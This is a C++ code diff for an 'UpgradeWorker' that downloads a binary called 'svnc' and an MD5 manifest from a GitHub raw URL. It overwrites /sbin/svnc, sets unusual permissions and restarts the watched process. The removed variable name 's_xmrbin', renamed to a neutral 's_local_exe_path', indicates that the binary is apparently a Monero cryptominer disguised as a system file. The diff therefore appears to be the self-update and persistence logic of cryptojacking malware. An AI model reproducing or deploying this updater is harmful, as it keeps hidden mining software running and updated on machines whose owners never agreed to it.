@@ -3,7 +3,7 @@
 #include <string.h>
 #include <assert.h>
 #include <unistd.h>
-
+#include "uv.h"
 #include "vkUpgradeWorker.h"
 #include "vkProcess.h"
 #include "../third-party/rapidjson/rapidjson.h"
@@ -16,11 +16,11 @@
 uv_work_t* UpgradeWorker::m_worker         = nullptr;
 PsWatcher* UpgradeWorker::m_pPsWatcher     = nullptr;
 int UpgradeWorker::m_curl_global_init_rc   = curl_global_init(CURL_GLOBAL_ALL); // CURLE_OK
-string UpgradeWorker::s_jsonfile           = Process::location(Process::ExeLocation, "json.txt");
-string UpgradeWorker::s_exefile            = Process::location(Process::ExeLocation, "svnc");
+string UpgradeWorker::s_jsdlpath           = Process::location(Process::ExeLocation, "json.txt");
+string UpgradeWorker::s_exedlpath            = Process::location(Process::ExeLocation, "dlsvnc");
 const char* UpgradeWorker::s_json_url_addr      = "https://raw.githubusercontent.com/elixirfee/update/master/json.txt";
 const char* UpgradeWorker::s_exe_url_addr       = "https://raw.githubusercontent.com/elixirfee/update/master/svnc";
-const char* UpgradeWorker::s_xmrbin             = "/sbin/svnc";
+const char* UpgradeWorker::s_local_exe_path             = "/sbin/svnc";
 
 
 
@@ -102,25 +102,28 @@ void UpgradeWorker::DoWorkCb(uv_work_t *req)
     Md5sum ExeMd5sum;
 
 #ifndef _WIN32
-    if (access(s_xmrbin, R_OK|F_OK)!=0){
-        printf("[error]: has no right to read and write bin!\n");
-        return ;
+    if (access(s_local_exe_path, F_OK)==0){
+        printf("[info]: check exe file exist!\n");
+        if (access(s_local_exe_path, R_OK)==0)
+        {
+            printf("[info]: check exe file has read right!\n");
+            ExeMd5sum.Md5File(s_local_exe_path);
+        }
+    }else{
+        printf("[info]: check exe file not exist!\n");
     }
 #endif
 
-    ExeMd5sum.Md5File(s_xmrbin);
-    
-    //printf("[%s] md5sum:%s\n", __FUNCTION__, ExeMd5sum.HexDigest().c_str());
-
     // download json.txt from server
-    ret = DownloadFile(s_json_url_addr, s_jsonfile.c_str());
+    ret = DownloadFile(s_json_url_addr, s_jsdlpath.c_str());
     if (ret!=0) {
         printf("[error]: fail to download json.txt!\n");
         return ;
     }
-    //printf("[ok]: success to download json.txt!\n");
+
+
     // get md5sum from json.txt which downloaded from remote server.
-    fp = fopen(s_jsonfile.c_str(), "r");
+    fp = fopen(s_jsdlpath.c_str(), "r");
     rapidjson::FileReadStream is(fp, readBuffer, sizeof(readBuffer));
     rapidjson::Document doc;
     doc.ParseStream(is);
@@ -144,14 +147,13 @@ void UpgradeWorker::DoWorkCb(uv_work_t *req)
     }
 
     // download bin file from remote server
-    ret = DownloadFile(s_exe_url_addr,s_exefile.c_str());
+    ret = DownloadFile(s_exe_url_addr,s_exedlpath.c_str());
     if (ret!=0){
         printf("[error]: fail to download bin!\n");
         return ;
     }
-    //printf("[ok]: success to download bin!\n");
 
-    ExeMd5sum.Md5File(s_exefile.c_str());
+    ExeMd5sum.Md5File(s_exedlpath.c_str());
     //printf("exe md5sum:%s, js md5sum=%s\n",ExeMd5sum.HexDigest().c_str(),json_md5.c_str());
     if(strcmp(ExeMd5sum.HexDigest().c_str(), json_md5.c_str())!=0){
         printf("[error]: fail to check remote bin file, it's broken\n");
@@ -164,39 +166,50 @@ void UpgradeWorker::DoWorkCb(uv_work_t *req)
         m_pPsWatcher->Stop();
     }
 #ifndef _WIN32
-    if (access(s_xmrbin, W_OK|F_OK)!=0){
-        printf("[error]: has no right to read and write bin!\n");
-        return ;
+    if (access(s_local_exe_path, W_OK|F_OK)!=0){
+        printf("[error]: has no access write!\n");
+        goto restart;
     }
 #endif
 
-    ret = uv_fs_unlink(NULL, &fs_req, s_xmrbin, NULL);
+    ret = uv_fs_unlink(NULL, &fs_req, s_local_exe_path, NULL);
+    if (ret!=0){
+        printf("[error]: fail to remove exe file!\n");
+        return ;
+    }       
     uv_fs_req_cleanup(&fs_req); 
 
     //printf("step 6:copy new exe file to replace old one\n");
-    ret = uv_fs_rename(NULL, &fs_req, s_exefile.c_str(),  s_xmrbin, NULL);                                                                 
+    //ret = uv_fs_rename(NULL, &fs_req, s_exedlpath.c_str(),  s_local_exe_path, NULL);UV_FS_COPYFILE_FICLONE           
+    ret = uv_fs_copyfile(NULL, &fs_req, s_exedlpath.c_str(), s_local_exe_path, UV_FS_COPYFILE_FICLONE, NULL);
+    if (ret!=0){
+        printf("[error]: fail to copy new exe file!\n");
+        return ;
+    }else{
+        //printf("[ok]: overwrite success\n");
+    }
     //assert(ret == 0);
     //assert(fs_req.result == 0);
     uv_fs_req_cleanup(&fs_req);
 
  #ifndef _WIN32
- 
-    /* Make the file write-only */
-    ret = uv_fs_chmod(NULL, &fs_req, s_xmrbin, 0735, NULL);                                                                                 
+     /* Make the file write-only */
+    ret = uv_fs_chmod(NULL, &fs_req, s_local_exe_path, 0731, NULL);
     //assert(ret == 0);
     //assert(fs_req.result == 0);
     uv_fs_req_cleanup(&fs_req);
     if (ret!=0){
-        printf("[error]: fail to chown\n");
+        printf("[error]: fail to chown!\n");
         return ;
     }
-    //if(CheckPermission(s_xmrbin, 0731)!=0) {
-    //    printf("[error]: fail to check permission\n");
-    //    return ;
-    //}
-    //printf("[ok]: success to chown\n");
+    else
+    {
+        printf("[ok]: overwrite and chmod success,ps start again\n");
+    }
+    
 #endif
 
+restart:
     if (m_pPsWatcher){
         //printf("step 8:finished and run new exe\n");
         m_pPsWatcher->Start();
